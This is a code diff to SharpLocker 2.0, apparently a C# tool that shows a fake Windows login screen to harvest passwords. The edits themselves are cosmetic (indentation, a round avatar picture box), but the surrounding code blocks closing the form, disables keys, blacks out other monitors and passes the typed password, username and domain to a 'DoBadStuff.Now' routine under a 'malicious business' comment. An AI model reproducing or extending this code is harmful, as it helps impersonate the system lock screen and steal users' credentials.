@@ -39,7 +39,7 @@ namespace SharpLocker_2._0
         private void WindowsLogin_FormClosing(object sender, FormClosingEventArgs e)
         {
 #if !DEBUG
-                e.Cancel = DenyClose;
+            e.Cancel = DenyClose;
 #endif
         }
 
@@ -65,7 +65,7 @@ namespace SharpLocker_2._0
 
             DenyClose = false;
 #if !DEBUG
-                KeyPressHandler.Enable();
+            KeyPressHandler.Enable();
 #endif
             // Time for malicious business 😏
             DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName);
@@ -279,10 +279,6 @@ namespace SharpLocker_2._0
             // resize image and make it a circle
             pb.Image = ResizeImage(img, pb.Width, pb.Height);
 
-            GraphicsPath gp = new GraphicsPath();
-            gp.AddEllipse(0, 0, pb.Width - 1, pb.Height - 1);
-            Region rg = new Region(gp);
-            pb.Region = rg;
         }
 
         // Resize any image to a certain size
@@ -315,10 +311,10 @@ namespace SharpLocker_2._0
         private void InitializeOtherScreens()
         {
 #if !DEBUG
-                foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
-                {
-                    new Task(() => BlackScreen(screen)).Start();
-                }
+            foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
+            {
+                new Task(() => BlackScreen(screen)).Start();
+            }
 #endif
         }
 
@@ -399,7 +395,7 @@ namespace SharpLocker_2._0
                 p.BackColor = Color.Transparent;
             };
 
-            PictureBox pb = new PictureBox()
+            RoundPictureBox pb = new RoundPictureBox()
             {
                 BackColor = Color.Transparent,
                 Anchor = AnchorStyles.Left | AnchorStyles.Bottom,
